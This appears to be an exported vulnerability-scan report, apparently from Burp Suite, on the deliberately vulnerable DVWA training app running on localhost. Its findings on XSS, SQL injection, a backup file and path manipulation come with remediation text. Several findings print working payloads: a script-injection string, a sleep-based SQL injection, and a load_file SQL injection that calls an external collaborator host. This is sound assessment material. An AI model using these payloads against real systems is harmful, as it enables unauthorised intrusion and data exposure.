        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "52",
        "host__ports__port__service__name": "https",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "12": {
        "\ufeffissue__serialNumber": "7.96784E+18",
        "issue__type": "6291672",
        "issue__name": "Backup file",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/config/config.inc.php",
        "issue__location": "/dvwa/config/config.inc.php.bak",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Publicly accessible backups and outdated copies of files can provide attackers with extra attack surface. Depending on the server configuration and file type, they may also expose source code, configuration details, and other information intended to remain secret.</p>",
        "issue__remediationBackground": "<p>Review the file to identify whether it's intended to be publicly accessible, and remove it from the server's web root if it isn't. It may also be worth auditing the server contents to find other outdated files, and taking measures to prevent the problem from reoccurring. </p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files\">Web Security Academy: Information disclosure via backup files</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n    <li><a href=\"https://cwe.mitre.org/data/definitions/530.html\">CWE-530: Exposure of Backup File to an Unauthorized Control Sphere</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/37.html\">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/204.html\">CAPEC-204: Lifting Sensitive Data Embedded in Cache</a></li>\\n</ul>",
        "issue__issueDetail": "",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "13": {
        "\ufeffissue__serialNumber": "4.98588E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli/",
        "issue__location": "/dvwa/vulnerabilities/sqli/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "14": {
        "\ufeffissue__serialNumber": "2.18532E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli/",
        "issue__location": "/dvwa/vulnerabilities/sqli/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>m3kx2'&gt;&lt;script&gt;alert(1)&lt;/script&gt;k5xoz</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "15": {
        "\ufeffissue__serialNumber": "2.35238E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli/",
        "issue__location": "/dvwa/vulnerabilities/sqli/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "16": {
        "\ufeffissue__serialNumber": "4.32379E+18",
        "issue__type": "1049088",
        "issue__name": "SQL injection",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/sqli/",
        "issue__location": "/dvwa/vulnerabilities/sqli/ [id parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>\\n<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>",
        "issue__remediationBackground": "<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>\\n<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>\\n<ul>\\n  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>\\n  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>\\n</ul>",
        "issue__references": "<ul>\\n<li><a href=\"https://portswigger.net/web-security/sql-injection\">Web Security Academy: SQL injection</a></li>\\n<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws\">Using Burp to Test for Injection Flaws</a></li>\\n<li><a href=\"https://portswigger.net/web-security/sql-injection/cheat-sheet\">Web Security Academy: SQL Injection Cheat Sheet</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/89.html\">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/94.html\">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/66.html\">CAPEC-66: SQL Injection</a></li>\\n</ul>",
        "issue__issueDetail": "The <b>id</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'+(select load_file('\\\\\\\\031gs2o7t9kay71iuv9qhfcaf1lu9rxi06rthh6.burpcollaborator.net\\\\kts'))+'</b> was submitted in the id parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.<br><br> Additionally, a single quote was submitted in the id parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the id parameter. The application took <b>20017</b> milliseconds to respond to the request, compared with <b>17</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ",
        "issue__collaboratorEvent__interactionType": "DNS",
        "issue__collaboratorEvent__originIp": "49.231.70.74",
        "issue__collaboratorEvent__time": "2022-Mar-10 10:12:37 UTC",
        "issue__collaboratorEvent__lookupType": "AAAA",
        "issue__collaboratorEvent__lookupHost": "031gs2o7t9kay71iuv9qhfcaf1lu9rxi06rthh6.burpcollaborator.net"
    },
    "17": {
        "\ufeffissue__serialNumber": "5.02368E+18",
        "issue__type": "1051392",
        "issue__name": "File path manipulation",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_source.php",
        "issue__location": "/dvwa/vulnerabilities/view_source.php [security parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>File path manipulation vulnerabilities arise when user-controllable data is placed into a file or URL path that is used on the server to access local resources, which may be within or outside the web root. If vulnerable, an attacker can modify the file path to access different resources, which may contain sensitive information. Even where an attack is constrained within the web root, it is often possible to retrieve items that are normally protected from direct access, such as application configuration files, the source code for server-executable scripts, or files with extensions that the web server is not configured to serve directly.</p>",
        "issue__remediationBackground": "<p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be placed into file or URL paths in order to access local resources on the server. This can normally be achieved by referencing known files via an index number rather than their name.</p>\\n<p>If it is considered unavoidable to place user data into file or URL paths, the data should be strictly validated against a whitelist of accepted values. Note that when accessing resources within the web root, simply blocking input containing file path traversal sequences (such as dot-dot-slash) is not always sufficient to prevent retrieval of sensitive information, because some protected items may be accessible at the original path without using any traversal sequences. </p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/file-path-traversal\">Web Security Academy: Directory traversal</a></li>\\n</ul>",
